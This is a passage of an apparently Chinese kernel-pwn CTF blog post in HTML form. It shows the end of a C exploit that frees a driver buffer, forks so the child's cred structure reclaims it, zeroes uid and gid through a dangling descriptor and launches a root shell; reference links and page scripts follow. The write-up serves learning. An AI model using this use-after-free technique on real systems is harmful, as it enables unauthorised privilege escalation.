<span class="hljs-comment">// 释放 fd1</span><br>	close(fd1);<br><br>	<span class="hljs-comment">// cred结构体和刚刚释放的babydev_struct大小相等</span><br>	<span class="hljs-comment">//按照用户态堆块分配规则的话，新起进程的cred会把刚刚释放的babydev_struct申请回来</span><br>	<span class="hljs-keyword">int</span> pid = fork();<br>	<span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fork error!&quot;</span>);<br>		<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span><br>		<span class="hljs-keyword">char</span> zeros[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>		write(fd2, zeros, <span class="hljs-number">28</span>);<br><br>		<span class="hljs-keyword">if</span>(getuid() == <span class="hljs-number">0</span>)<br>		&#123;<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] root now.&quot;</span>);<br>			system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>			<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>		&#125;<br>	&#125;<br>	<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		wait(<span class="hljs-literal">NULL</span>);<br>	&#125;<br>	close(fd2);<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HdXa20H57rBki5_K_ex67A">https://mp.weixin.qq.com/s/HdXa20H57rBki5_K_ex67A</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/255884">https://www.anquanke.com/post/id/255884</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86490">https://www.anquanke.com/post/id/86490</a></p>
+<p><a target="_blank" rel="noopener" href="https://ama2in9.top/2020/09/03/kernel/">https://ama2in9.top/2020/09/03/kernel/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/kernel-pwn/">kernel pwn</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/23/AFL-%E6%8C%96%E6%8E%98ImageMagick/">
+                        <span class="hidden-mobile">AFL++ 挖掘ImageMagick</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
